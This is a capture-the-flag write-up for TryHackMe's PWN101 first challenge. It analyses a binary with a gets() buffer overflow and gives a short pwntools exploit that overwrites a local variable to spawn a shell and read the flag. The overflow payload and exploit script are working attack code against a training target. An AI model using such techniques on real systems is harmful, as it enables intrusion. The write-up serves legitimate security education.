# PWN101
This is a quick writeup for the PWN101 (Binary exploitation challenges) on <a href="https://tryhackme.com/room/pwn101">tryhackme.</a> Go take a look.
<h2 style="color:purple;">Challenge 1 - pwn101</h2>
This should give you a start: 'AAAAAAAAAAA'

Challenge is running on port 9001

**File Check:**<br>

```sh
file pwn101.pwn101
pwn101.pwn101: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd42eee3cfdffb116dfdaa750dbe4cc8af68cf43, not stripped
   
 ```
**Discovery:**
<p align="center">

<img src="https://github.com/tareqraihan926/TryHackme-PWN101/blob/main/ss/discovery.png" width="" height="">
</p>

**Analysis:**
```sh
trinity@trinity-HP-Pavilion-Laptop-15-cc0xx:~/Downloads/tryhackme/PWN-101$ checksec pwn101.pwn101
[*] '/home/trinity/Downloads/tryhackme/PWN-101/pwn101.pwn101'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```
 
 I am Using Cutter to analysis & get the structure-
 
 <p align="center">

<img src="https://github.com/tareqraihan926/TryHackme-PWN101/blob/main/ss/structur.png" width="" height="">
</p>

 The win condition is the following : <br>
 ```sh
      0x000008da   cmp dword [var_4h], 0x539
 ┌─<  0x000008e1   jne 0x8f9

 ```
 If the value of the local variable var 4h is no more equal to 0x539
 ```sh
 │     0x00000896   mov dword [var_4h], 0x539
 
```

then a /bin/sh is spawned

The local variable are :
```sh
│     ; var uint32_t var_4h @ rbp-0x4
│     ; var char *str @ rbp-0x40
```
The input data are received in rbp-0x40

```sh
│     0x000008cd   mov rdi, rax                ; char *str         
│     0x000008d0   mov eax, 0
│     0x000008d5   call sym.imp.gets           ; gets(str)
```

and has no control over the message's length. The value is then modified if the message is longer than 60 (0xx60-4).holds the message's linefeed, so 59 characters are sufficient.

**Exploitation:**
```sh
from pwn import *

context.binary = binary = "./pwn101.pwn101"

payload = b"A"*((0x40-0x4)+1)

#p = process()
p = remote("10.10.99.150", 9001)
p.recv()
p.sendline(payload)
p.interactive()
```

Running the Exploit-
```sh
trinity@trinity-HP-Pavilion-Laptop-15-cc0xx:~/Downloads/tryhackme/PWN-101$ python3 exploit.py
[*] '/home/trinity/Downloads/tryhackme/PWN-101/pwn101.pwn101'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 10.10.99.150 on port 9001: Done
[*] Switching to interactive mode

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani: 
Thanks, Here's a small gift for you <3
$ ls
flag.txt
pwn101
pwn101.c
$ 
$ cat flag.txt
THM{7h4t's_4n_3zy_oveRflowwwww}
```
